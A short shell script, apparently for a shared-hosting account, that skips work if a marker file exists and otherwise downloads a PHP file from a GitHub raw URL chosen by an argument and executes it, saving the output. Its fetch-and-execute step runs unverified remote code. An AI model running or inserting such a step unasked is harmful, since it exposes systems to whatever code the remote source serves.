#!/bin/sh
cd /home/u791571885 && [ -f t162.done ] && tail -c 9000 t162.done && exit 0
curl -fsSL -o t162.php "https://raw.githubusercontent.com/a04032417-svg/Dar/$1/vs162.php" && /opt/alt/php83/usr/bin/php t162.php > t162.done 2>&1; tail -c 9000 t162.done
